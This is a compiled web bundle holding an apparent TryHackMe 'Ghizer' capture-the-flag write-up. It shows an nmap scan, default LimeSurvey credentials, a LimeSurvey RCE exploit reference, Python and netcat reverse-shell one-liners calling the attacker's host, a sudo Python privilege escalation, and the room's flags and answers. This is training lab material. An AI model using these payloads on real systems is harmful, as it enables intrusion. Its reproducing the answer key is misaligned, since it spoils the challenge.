"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[4733],{3905:(e,n,t)=>{t.d(n,{Zo:()=>u,kt:()=>h});var r=t(67294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var l=r.createContext({}),p=function(e){var n=r.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},u=function(e){var n=p(e.components);return r.createElement(l.Provider,{value:n},e.children)},c="mdxType",x={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},m=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),c=p(t),m=o,h=c["".concat(l,".").concat(m)]||c[m]||x[m]||a;return t?r.createElement(h,s(s({ref:n},u),{},{components:t})):r.createElement(h,s({ref:n},u))}));function h(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,s=new Array(a);s[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[c]="string"==typeof e?e:o,s[1]=i;for(var p=2;p<a;p++)s[p]=t[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,t)}m.displayName="MDXCreateElement"},31852:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>x,frontMatter:()=>a,metadata:()=>i,toc:()=>p});var r=t(87462),o=(t(67294),t(3905));const a={},s="Ghizer",i={unversionedId:"Tryhackme/Ghizer/Ghizer",id:"Tryhackme/Ghizer/Ghizer",title:"Ghizer",description:"lucrecia has installed multiple web applications on the server.",source:"@site/writeups/Tryhackme/Ghizer/Ghizer.md",sourceDirName:"Tryhackme/Ghizer",slug:"/Tryhackme/Ghizer/",permalink:"/writeups/Tryhackme/Ghizer/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Getting Started",permalink:"/writeups/Tryhackme/Getting Started/"},next:{title:"Git Happens",permalink:"/writeups/Tryhackme/Git Happens/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Flag",id:"task-1-flag",level:2}],u={toc:p},c="wrapper";function x(e){let{components:n,...t}=e;return(0,o.kt)(c,(0,r.Z)({},u,t,{components:n,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"ghizer"},"Ghizer"),(0,o.kt)("p",null,"lucrecia has installed multiple web applications on the server."),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/ghizerctf"},"Ghizer")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,o.kt)("li",{parentName:"ul"},"CVE-2018-17057 - LimeSurvey < 3.16"),(0,o.kt)("li",{parentName:"ul"},"Stored Passwords & Keys"),(0,o.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-flag"},"Task 1 Flag"),(0,o.kt)("p",null,"Are you able to complete the challenge?\nThe machine may take up to 5 minutes to boot and configure"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Ghizer$ sudo nmap -A -sS -sC -sV -O 10.10.106.146\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 17:18 CEST\nNmap scan report for 10.10.106.146\nHost is up (0.032s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE  VERSION\n21/tcp  open  ftp?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest, X11Probe:\n|     220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)\n|     Please login with USER and PASS.\n|   Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie:\n|_    220 Welcome to Anonymous FTP server (vsFTPd 3.0.3)\n80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: LimeSurvey http://www.limesurvey.org\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title:         LimeSurvey\n443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))\n|_http-generator: WordPress 5.4.2\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Ghizer &#8211; Just another WordPress site\n| ssl-cert: Subject: commonName=ubuntu\n| Not valid before: 2020-07-23T17:27:31\n|_Not valid after:  2030-07-21T17:27:31\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|_  http/1.1\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port21-TCP:V=7.80%I=7%D=10/11%Time=5F83224D%P=x86_64-pc-linux-gnu%r(NUL\nSF:L,33,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x2\nSF:03\\.0\\.3\\)\\n")%r(GenericLines,58,"220\\x20Welcome\\x20to\\x20Anonymous\\x20\nSF:FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\\nSF:x20USER\\x20and\\x20PASS\\.\\n")%r(Help,58,"220\\x20Welcome\\x20to\\x20Anonymo\nSF:us\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x2\nSF:0with\\x20USER\\x20and\\x20PASS\\.\\n")%r(GetRequest,58,"220\\x20Welcome\\x20t\nSF:o\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\nSF:\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n")%r(HTTPOptions,58,"220\\x2\nSF:0Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n\nSF:530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n")%r(RTSPReque\nSF:st,58,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x\nSF:203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n"\nSF:)%r(RPCCheck,33,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\nSF:\\(vsFTPd\\x203\\.0\\.3\\)\\n")%r(DNSVersionBindReqTCP,58,"220\\x20Welcome\\x20\nSF:to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Pleas\nSF:e\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n")%r(DNSStatusRequestTCP,5\nSF:8,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\\nSF:.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20PASS\\.\\n")%r(\nSF:SSLSessionReq,33,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x2\nSF:0\\(vsFTPd\\x203\\.0\\.3\\)\\n")%r(TerminalServerCookie,33,"220\\x20Welcome\\x2\nSF:0to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n")%r(TLSSes\nSF:sionReq,33,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsF\nSF:TPd\\x203\\.0\\.3\\)\\n")%r(Kerberos,33,"220\\x20Welcome\\x20to\\x20Anonymous\\x\nSF:20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n")%r(SMBProgNeg,33,"220\\x20We\nSF:lcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n")%\nSF:r(X11Probe,58,"220\\x20Welcome\\x20to\\x20Anonymous\\x20FTP\\x20server\\x20\\(\nSF:vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\x20USER\\x20and\\x20P\nSF:ASS\\.\\n")%r(FourOhFourRequest,58,"220\\x20Welcome\\x20to\\x20Anonymous\\x20\nSF:FTP\\x20server\\x20\\(vsFTPd\\x203\\.0\\.3\\)\\n530\\x20Please\\x20login\\x20with\\\nSF:x20USER\\x20and\\x20PASS\\.\\n");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/11%OT=21%CT=1%CU=43159%PV=Y%DS=2%DC=T%G=Y%TM=5F8322\nOS:F6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=7%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC\nOS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 993/tcp)\nHOP RTT      ADDRESS\n1   30.98 ms 10.8.0.1\n2   31.23 ms 10.10.106.146\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 178.89 seconds\n')),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.106.146/index.php/admin/authentication/sa/login"},"http://10.10.106.146/index.php/admin/authentication/sa/login")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://survey-consulting.com/how-to-restore-a-limesurvey-password/"},"https://survey-consulting.com/how-to-restore-a-limesurvey-password/")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"admin:password")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"http://10.10.106.146/installer/"},"http://10.10.106.146/installer/")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/46634"},"LimeSurvey < 3.16 - Remote Code Execution ")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-php"},"'username' => 'Anny',\n                        'password' => 'P4$W0RD!!#S3CUr3!',\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"https://10.10.106.146/?devtools\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run()")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},'print new java.lang.Runtime().exec("nc 10.8.106.222 1337 -e /bin/sh")')),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Ghizer$ nc -nvlp 1337\nlistening on [any] 1337 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.106.146] 40546\npython -c \"import pty; pty.spawn('/bin/bash')\"\nveronica@ubuntu:~$ cd ~\ncd ~\nveronica@ubuntu:~$ ls\nls\nbase.py  Documents  examples.desktop  Music     Public       Templates  Videos\nDesktop  Downloads  ghidra_9.0        Pictures  __pycache__  user.txt\nveronica@ubuntu:~$ cat user.txt\ncat user.txt\nTHM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}\nveronica@ubuntu:~$\n")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"echo 'import pty; pty.spawn(\"/bin/bash\")' >> /home/veronica/base.py")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},'veronica@ubuntu:~$ rm -rf base.py\nrm -rf base.py\nveronica@ubuntu:~$ echo \'import pty; pty.spawn("/bin/bash")\' >> /home/veronica/base.py\n<port pty; pty.spawn("/bin/bash")\' >> /home/veronica/base.py\nveronica@ubuntu:~$ sudo /usr/bin/python3.5 /home/veronica/base.py\nsudo /usr/bin/python3.5 /home/veronica/base.py\nroot@ubuntu:~# whoami\nwhoami\nroot\nroot@ubuntu:~# cd /root\ncd /root\nroot@ubuntu:/root# ls\nls\nLucrecia  root.txt\nroot@ubuntu:/root# cat root.txt\ncat root.txt\nTHM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}\nroot@ubuntu:/root#\n')),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"What are the credentials you found in the configuration file? example: user:password")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Anny:P4$W0RD!!#S3CUr3!")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"What is the login path for the wordpress installation?")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"/?devtools")),(0,o.kt)("ol",{start:3},(0,o.kt)("li",{parentName:"ol"},"Compromise the machine and locate user.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{EB0C770CCEE1FD73204F954493B1B6C5E7155B177812AAB47EFB67D34B37EBD3}")),(0,o.kt)("ol",{start:4},(0,o.kt)("li",{parentName:"ol"},"Escalate privileges and obtain root.txt")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"THM{02EAD328400C51E9AEA6A5DB8DE8DD499E10E975741B959F09BFCF077E11A1D9}")))}x.isMDXComponent=!0}}]);